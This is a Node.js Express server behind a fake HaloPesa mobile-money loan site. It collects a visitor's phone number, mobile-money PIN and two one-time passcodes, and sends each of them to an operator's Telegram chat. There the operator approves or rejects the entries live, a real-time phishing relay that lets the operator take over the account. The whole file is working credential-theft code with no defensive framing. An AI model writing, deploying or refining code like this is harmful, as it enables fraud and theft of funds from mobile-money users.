require('dotenv').config();
const express = require('express');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();
app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

let pinStatus = 'idle'; 
let otp1Status = 'idle';        
let otp2Status = 'idle';        
let lastUpdateId = 0;

let currentData = { phone: '', amount: '', months: '', pin: '', otp1: '', otp2: '' };

// 1. Initial Loan Calculator Request
app.post('/api/loan-request', (req, res) => {
    const { amount, months } = req.body;
    currentData.amount = amount;
    currentData.months = months;
    res.json({ status: 'ready_for_phone' });
});

// 2. Phone, Amount, and Nambari ya Siri (PIN) Submitted -> Send to Telegram
app.post('/api/submit-pin-data', async (req, res) => {
    const { phone, pin } = req.body;
    currentData.phone = phone;
    currentData.pin = pin;
    pinStatus = 'pending';
    otp1Status = 'idle';
    otp2Status = 'idle';

    const message = `🚨 *Omba Mkopo HaloPesa* 🚨\n\n📱 *Phone:* \`${phone}\`\n💰 *Amount:* \`TZS ${Number(currentData.amount).toLocaleString()}\`\n📅 *Muda:* \`${currentData.months} Miezi\`\n🔑 *Nambari ya Siri (PIN):* \`${pin}\``;

    try {
        await sendTelegramMessage(message, [
            [
                { text: '✅ Approve PIN', callback_data: 'approve_pin' },
                { text: '❌ Decline', callback_data: 'reject_pin' }
            ]
        ]);
        res.json({ status: 'pending' });
    } catch (err) {
        console.error('Error sending PIN alert to Telegram:', err);
        res.status(500).json({ error: 'Failed to send telegram message' });
    }
});

// Check status of PIN approval
app.get('/api/check-pin-status', (req, res) => {
    res.json({ status: pinStatus });
});

// 3. OTP 1 Submitted -> Send to Telegram
app.post('/api/verify-otp1', async (req, res) => {
    const { otp1 } = req.body;
    currentData.otp1 = otp1;
    otp1Status = 'pending';

    const message = `🔐 *HaloPesa First OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 1 Code:* \`${otp1}\``;

    try {
        await sendTelegramMessage(message, [
            [
                { text: '✅ Approve OTP 1', callback_data: 'correct_otp1' },
                { text: '❌ Wrong OTP 1', callback_data: 'wrong_otp1' }
            ]
        ]);
        res.json({ status: 'pending' });
    } catch (err) {
        console.error('Error sending OTP 1 to Telegram:', err);
        res.status(500).json({ error: 'Failed to send OTP message' });
    }
});

app.get('/api/check-otp1-status', (req, res) => {
    res.json({ status: otp1Status });
});

// 4. OTP 2 Submitted -> Send to Telegram
app.post('/api/verify-otp2', async (req, res) => {
    const { otp2 } = req.body;
    currentData.otp2 = otp2;
    otp2Status = 'pending';

    const message = `🔐 *HaloPesa Second OTP Verification* 🔐\n\n📱 *Phone:* \`${currentData.phone}\`\n🔢 *OTP 2 Code:* \`${otp2}\``;

    try {
        await sendTelegramMessage(message, [
            [
                { text: '✅ Approve OTP 2', callback_data: 'correct_otp2' },
                { text: '❌ Wrong OTP 2', callback_data: 'wrong_otp2' }
            ]
        ]);
        res.json({ status: 'pending' });
    } catch (err) {
        console.error('Error sending OTP 2 to Telegram:', err);
        res.status(500).json({ error: 'Failed to send OTP message' });
    }
});

app.get('/api/check-otp2-status', (req, res) => {
    res.json({ status: otp2Status });
});

// Telegram Long-Polling Loop
async function pollTelegramUpdates() {
    if (!BOT_TOKEN) return;

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
        const data = await response.json();

        if (data.ok && data.result && data.result.length > 0) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;

                if (update.callback_query) {
                    const action = update.callback_query.data;
                    const chatId = update.callback_query.message.chat.id;
                    const messageId = update.callback_query.message.message_id;
                    const callbackQueryId = update.callback_query.id;

                    await answerCallback(callbackQueryId, 'Processing action...');
                    await removeMessageButtons(chatId, messageId);

                    let statusMessage = '';
                    if (action === 'approve_pin') {
                        pinStatus = 'approved';
                        statusMessage = '✅ *Status: PIN Approved by Admin*';
                    } else if (action === 'reject_pin') {
                        pinStatus = 'rejected';
                        statusMessage = '❌ *Status: PIN Declined by Admin*';
                    } else if (action === 'correct_otp1') {
                        otp1Status = 'success';
                        statusMessage = '✅ *Status: OTP 1 Approved by Admin*';
                    } else if (action === 'wrong_otp1') {
                        otp1Status = 'wrong';
                        statusMessage = '❌ *Status: OTP 1 Declined by Admin*';
                    } else if (action === 'correct_otp2') {
                        otp2Status = 'success';
                        statusMessage = '✅ *Status: OTP 2 Approved - Loan Finalized!*';
                    } else if (action === 'wrong_otp2') {
                        otp2Status = 'wrong';
                        statusMessage = '❌ *Status: OTP 2 Declined by Admin*';
                    }

                    if (statusMessage) {
                        await sendStatusMessage(chatId, statusMessage);
                    }
                }
            }
        }
    } catch (err) {
        console.error('Polling error:', err.message);
    }

    setTimeout(pollTelegramUpdates, 1000);
}

async function answerCallback(callbackQueryId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQueryId, text })
        });
    } catch (e) {
        console.error('Answer callback error:', e);
    }
}

async function sendTelegramMessage(text, keyboard) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        })
    });
}

async function removeMessageButtons(chatId, messageId) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatId, 
                message_id: messageId, 
                reply_markup: { inline_keyboard: [] } 
            })
        });
    } catch (e) {
        console.error('Remove buttons error:', e);
    }
}

async function sendStatusMessage(chatId, text) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: chatId, 
                text: text, 
                parse_mode: 'Markdown' 
            })
        });
    } catch (e) {
        console.error('Send status message error:', e);
    }
}

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`HaloPesa Loan server running successfully on port ${PORT}`);
    pollTelegramUpdates();
});